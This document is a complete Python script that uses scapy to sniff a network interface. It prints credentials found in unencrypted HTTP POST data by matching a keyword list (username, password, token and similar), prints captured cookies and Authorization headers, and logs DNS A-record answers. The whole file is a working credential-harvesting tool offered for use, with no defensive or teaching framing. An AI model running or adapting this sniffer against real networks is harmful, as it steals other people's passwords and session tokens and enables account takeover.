#!/usr/bin/env python
import argparse

import scapy.all as scapy
from scapy.layers import http

credentials_keywords = ['username',
                        'user',
                        'login',
                        'email',
                        'e-mail',
                        'auth',
                        'password',
                        'pass',
                        'key',
                        '_user',
                        '_username',
                        '_pass',
                        '_password',
                        '_email',
                        'token',
                        '_token']


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Network interface to capture data from')
    parser.add_argument('--http', action="store_true",
                        help='Capture plain old unencrypted HTTP')
    parser.add_argument('--cookies', action="store_true",
                        help='Capture http cookies and authorization headers. '
                             'By default -http option will capture credentials only from POST data.')
    parser.add_argument('--dns', action='store_true',
                        help='Capture DNS records')

    options = parser.parse_args()
    if not options.interface:
        parser.error('Please, specify a network interface. See --help for more info')
    return options


def sniff(interface):
    print('[+] Starting packets sniff on ' + interface)
    if options.dns:
        print('\t>>> DNS sniffing enabled.')
    if options.http:
        print('\t>>> http sniffing enabled.')
    if options.cookies:
        print('\t>>> http-cookies sniffing enabled.')
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if options.http and packet.haslayer(http.HTTPRequest):
        process_http_packet(packet)
        return
    if options.dns and packet.haslayer(scapy.DNSQR):
        process_dns_packet(packet)
        return


def process_http_packet(packet):
    source_ip = get_source_ip(packet)
    method = packet[http.HTTPRequest].Method
    url = get_url(packet)
    print('[HTTP]\t' + source_ip + ' ' + method + ' ' + url)
    if options.cookies:
        capture_cookies(packet)
    if packet.haslayer(scapy.Raw):
        post_data = get_post_data(packet)
        if post_data:
            print('\n\t[*] Captured credentials: ' + str(post_data) + '\n\n')


def process_dns_packet(packet):
    if packet.haslayer(scapy.DNSRR) and packet[scapy.DNSRR].type == 1:  # 1 is stands for 'A' DNS record
        dest_ip = get_dest_ip(packet)
        domain_name = packet[scapy.DNSRR].rrname
        domain_ip_address = packet[scapy.DNSRR].rdata
        print('[DNS]\t' + dest_ip + ' <<< ' + domain_name + ' (' + domain_ip_address + ')')


def capture_cookies(packet):
    cookie = packet[http.HTTPRequest].Cookie
    authorization = packet[http.HTTPRequest].Authorization
    if cookie:
        print('[*] Captured cookie: ' + str(cookie))
    if authorization:
        print('[*] Captured authorization: ' + str(authorization))
    if cookie or authorization:
        print('\n')


def get_url(packet):
    url = 'http://' + packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url


def get_post_data(packet):
    load = packet[scapy.Raw].load
    if any(keyword in load for keyword in credentials_keywords):
        return load


def get_source_ip(packet):
    return packet[scapy.IP].src


def get_dest_ip(packet):
    return packet[scapy.IP].dst


options = get_arguments()
sniff(options.interface)
